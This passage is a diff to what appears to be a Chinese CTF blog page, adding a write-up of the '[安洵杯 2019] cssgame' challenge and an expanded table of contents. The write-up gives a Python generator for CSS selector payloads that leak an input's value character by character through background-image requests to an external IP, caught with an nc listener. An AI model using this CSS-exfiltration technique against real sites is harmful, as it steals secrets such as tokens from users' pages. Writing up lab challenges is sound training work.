+<p><a href="https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/" target="_blank" rel="noopener">https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/</a></p>
+</blockquote>
+<h3 id="0x-10-安洵杯-2019-cssgame"><a href="#0x-10-安洵杯-2019-cssgame" class="headerlink" title="0x 10 [安洵杯 2019]cssgame"></a>0x 10 [安洵杯 2019]cssgame</h3><ul>
+<li><p>考点</p>
+<p>CSS注入</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>打开靶机，显示界面如下：</li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222257298.png" alt></p>
+<p>右键查看源代码发现：</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222412267.png" alt></p>
+<p>可以看到flag的值就在标签<code>&lt;input&gt;</code>的<code>value</code>属性</p>
+<p>然后我们通过靶机发送<code>css</code>参数给内网的flag.html，flag.html接收后将<code>css</code>拼接到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;$&#123;encodeURI(req.query.css)&#125;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过<strong>css injection</strong>来窃取内网flag值，这里可以参考微笑师傅的文章：<a href="https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p>
+<p>构造exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.108.172:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>将<code>css=http://174.0.108.172/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag</p>
+<p>这里环境问题数据可能会传不到内网，需要不停的发包直至收到nc收到请求的信息，坑了我一上午，我裂开了</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</a></p>
+</blockquote>
 
   </div>
 </article>
@@ -247,7 +436,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-你的名字"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]你的名字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-RCTF-2019-Nextphp"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [RCTF 2019]Nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-SCTF2019-Flag-Shop"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [SCTF2019]Flag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-NESTCTF-2019-Love-Math-2"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [NESTCTF 2019]Love Math 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-Zer0pts2020-Can-you-guess-it"><span class="toc-number">8.</span> <span class="toc-text">0x 08 [Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-Zer0pts2020-musicblog"><span class="toc-number">9.</span> <span class="toc-text">0x 09 [Zer0pts2020]musicblog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-10-安洵杯-2019-cssgame"><span class="toc-number">10.</span> <span class="toc-text">0x 10 [安洵杯 2019]cssgame</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
